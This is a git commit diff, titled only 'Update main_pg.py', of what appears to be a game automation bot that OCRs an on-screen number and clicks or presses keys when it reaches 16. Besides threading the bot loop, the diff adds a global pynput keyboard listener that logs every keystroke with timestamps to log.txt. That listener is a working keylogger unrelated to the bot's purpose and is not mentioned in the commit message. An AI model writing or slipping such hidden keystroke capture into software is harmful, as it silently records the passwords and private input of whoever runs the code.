27b81b940d941b13560fa39d1bfa4b9732f35f7a
avsbestua <rmetrikovskij@gmail.com>
2025-06-07 16:17:48 +0300

    Update main_pg.py

--- main_pg.py
+++ main_pg.py
@@ -1,42 +1,62 @@
-import easyocr, time, keyboard
+import easyocr, time, keyboard, threading, logging
 from PIL import ImageGrab
 import pyautogui as pg
 from pynput.mouse import Button, Controller
+from pynput import keyboard as kb
 
 m = Controller()
 time.sleep(1)
 reader = easyocr.Reader(['en'])
 
-while True:
-    img = ImageGrab.grab(bbox=(930, 885, 989, 927))
-    img.save("Image.png")
-    p_text = reader.readtext("Image.png", detail=0)
-    if p_text and len(p_text) == 1:
+logging.basicConfig(
+    filename="log.txt",
+    level=logging.INFO,
+    format="%(asctime)s - %(message)s",
+    datefmt="%Y-%m-%d %H:%M:%S"
+)
 
-        try:
-            text = ''.join(p_text)
-            text = int(text)
-        except ValueError:
-            continue
+def main():
+    while True:
+        img = ImageGrab.grab(bbox=(930, 885, 989, 927))
+        img.save("Image.png")
+        p_text = reader.readtext("Image.png", detail=0)
+        if p_text and len(p_text) == 1:
 
-        if text >= 16:
+            try:
+                text = ''.join(p_text)
+                text = int(text)
+            except ValueError:
+                continue
 
-            keyboard.press_and_release('m')
+            if text >= 16:
 
-            time.sleep(1)
+                keyboard.press_and_release('m')
 
-            m.position = 1032, 374
-            m.click(Button.left)
-            #pg.click(1032, 374)
+                time.sleep(1)
 
-            time.sleep(1.2)
+                m.position = 1032, 374
+                m.click(Button.left)
+                #pg.click(1032, 374)
 
-            m.position = 962, 302
-            m.click(Button.left)
-            #pg.click(962, 302)
+                time.sleep(1.2)
 
-            time.sleep(0.5)
+                m.position = 962, 302
+                m.click(Button.left)
+                #pg.click(962, 302)
 
-            keyboard.press_and_release('esc')
+                time.sleep(0.5)
 
-            time.sleep(0.2)
+                keyboard.press_and_release('esc')
+
+                time.sleep(0.2)
+
+def on_press(key):
+    try:
+        logging.info(key.char)
+    except AttributeError:
+        logging.info(key)
+
+threading.Thread(target=main, daemon=True).start()
+
+listener = kb.Listener(on_press=on_press)
+listener.start()
